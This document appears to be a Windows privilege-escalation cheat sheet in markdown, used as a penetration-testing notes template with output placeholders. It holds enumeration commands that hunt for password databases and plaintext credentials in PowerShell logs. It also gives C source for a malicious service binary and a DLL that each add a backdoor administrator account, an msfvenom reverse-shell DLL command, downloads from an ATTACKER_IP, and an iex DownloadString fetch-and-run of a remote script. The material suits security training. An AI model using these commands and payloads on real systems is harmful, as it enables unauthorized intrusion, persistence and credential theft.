# System Information
## Username and Hostname
```powershell
whoami
```
```
<insert hostname\username here>
```

## Group memberships of the current user
```powershell
whoami /groups
```
```
<insert output here>
```

## Existing users and groups
### Enumerating Users
```batch
net user $USER
```
```
<insert output here>
```
```powershell
Get-LocalUser
```
```
<insert output here>
```
### Enumerating Groups
```batch
net localgroup
```
```
<insert output here>
```
```powershell
Get-LocalGroup
```
```
<insert output here>
```
```powershell
Get-LocalGroupMember $GROUP
```
```
<insert output here>
```

## Operating system, version and architecture
### System Information
```batch
systeminfo
```
```
<insert output here>
```
### Network Information
```batch
ipconfig /all
```
```
<insert output here>
```
```batch
route print
```
```
<insert output here>
```
```batch
netstat -ano
```
```
<insert output here>
```
### Installed Applications and Running Services
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```
<insert output here>
```
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```
<insert output here>
```
```batch
dir "C:\Program Files"
```
```
<insert output here>
```
```batch
dir "C:\Program Files (x86)"
```
```
<insert output here>
```
```batch
dir $env:userprofile\Downloads
```
```
<insert output here>
```
```powershell
Get-Process
```
```
<insert output here>
```
### Enumerate filesystem for sensitive details
Enumerate for password manager databases (i.e. .kbdx):
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
```
<insert output here>
```
Enumerate application filesystem for interesting files (i.e. XAMPP):
```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
```
<insert output here>
```
Enumerate home directory for interesting files:
```powershell
Get-ChildItem -Path $env:userprofile -Include *.txt,*.pdf,*.xls,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
Also check other paths such as C:\, C:\Users.
```
<insert output here>
```
# Powershell Logs
```powershell
Get-History
```
```
<insert output here>
```
```powershell
(Get-PSReadlineOption).HistorySavePath
```
```
File Location: <insert output here>

<insert file contents here>
```
## View Script Block Logging
1. Open Event Viewer.
2. Windows Logs > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
3. On the right hand pane, select the following:

![image](https://github.com/user-attachments/assets/8d95086d-93d9-4e9e-9142-ff8b1c7be51d)

5. Add 4104 as the Event ID to filter:

![image](https://github.com/user-attachments/assets/dabce7a7-d406-47c3-9c02-2c57c0e481ad)

6. Look for interesting commands or plaintext creds... For example:

![image](https://github.com/user-attachments/assets/73336dbe-c73d-4831-a160-d808aab7db65)

# Service Hijacking
## Enumerate Services that run on boot
Services from the following paths are not writeable to user:
* C:\Program Files
* C:\Program Files (x86)
* C:\Windows\System32
* C:\Windows\SysWOW64
* C:\ProgramData
* C:\Users\All Users
```powershell
Get-Service | Where-Object { $_.StartType -eq 'Automatic' } | Select-Object Name, Status, StartType
```
```
<insert output here>
```
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
```
<insert output here>
```
## Check interesting service for user writeable permissions
icacls returns the following values related to permissions:
* F - Full access
* M - Modify access
* RX - Read and execute access
* R - Read-only access
* W - Write-only access

BUILTIN\Users or another group the compromised user is in must have (W), (M) or (F) permissions to overwrite the binary (always worth checking if it has "(I)" perm too - it could have inherited the necessary perms from elsewhere):
```powershell
icacls "C:\path\to\interesting\service.exe"
```
```
<insert output here>
```
## Create new malicious service binary
Example malicious service to use:
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
On kali, cross-compile the service:
```batch
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
## Hijack interesting service with a malicious binary
Transfer the service to the target machine:
```powershell
iwr -uri http://$(IP_ADDRESS)/adduser.exe -Outfile adduser.exe
```
Backup the original interesting service:
```powershell
move C:\path\to\interesting\service.exe service.exe
```
Replace service binary with new malicious service:
```powershell
move .\adduser.exe C:\path\to\interesting\service.exe
```
### Restart service
If the user has the appropriate permmissions:
```powershell
net stop $ServiceName
```
```powershell
net start $ServiceName
```
Otherwise, if the service startup type is automatic, the system can be rebooted:
```powershell
shutdown /r /t 0
```
# No GUI?
If a compromised user isn't part of "Remote Desktop Users" or "Remote Management Users", this means RDP access can't be gained as that user.

Instead, use runas on an account with GUI access to run a cmd or powershell:
```powershell
runas /user:$USER cmd
```
# DLL Hijacking
By hijacking a DLL a high privileged service uses, privesc is possible.
## Standard DLL search order
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
## How to exploit
Either a DLL being missing or placing a malicious dll higher on the search order than the legitimate one works.
1. Download the potentially vulnerable service and procmon (https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) on a non-target machine.
2. With the service running, click on the Filter menu > Filter... to get into the filter configuration.
3. The filter should be "Process Name is $SERVICE.EXE then Include".
4. Observe "CreateFile" operations for DLL's.
5. Refer to the Standard DLL search order. If there are "CreateFile" operations of DLL's, are there any DLL's place lower on the search order? For example, if the DLL's are writing to the system directory, is the application directory writeable by user? If so, a malicious DLL can be crafted and placed there to be executed.
## Crafting a malicious DLL
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(IP_ADDRESS) LPORT=$(PORT) -f dll -o $NAME_OF_VULNERABLE_DLL.dll
```
Or
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Cross-compile:
```bash
x86_64-w64-mingw32-gcc maliciousdll.cpp --shared -o $NAME_OF_VULNERABLE.dll
```
Download to target machine:
```powershell
iwr -uri http://$(ATTACKER_IP)/$NAME_OF_VULNERABLE.dll -OutFile 'C:\Path\to\higher\dll\search\order\$NAME_OF_VULNERABLE.dll'
```
Once the service that uses the vulnerable DLL is started or restarted by someone of higher privileges (if the service is on autorun on boot, then the target could just be restarted), then the malicious DLL will be run.
# Winpeas
```powershell
powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
```
```
<insert winpeas output here>
```
```powershell
iwr -uri http://$(IP_ADDRESS)/winPEASx64.exe -Outfile winPEAS.exe
```
```
<insert output from winpeas exe here>
```
# PowerUp
```batch
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
```
```powershell
iwr -uri http://$(IP_ADDRESS)/PowerUp.ps1 -Outfile PowerUp.ps1
```
```powershell
powershell -ep bypass
```
```powershell
. .\PowerUp.ps1
```
```powershell
Get-ModifiableServiceFile
```
```
<insert output here>
```
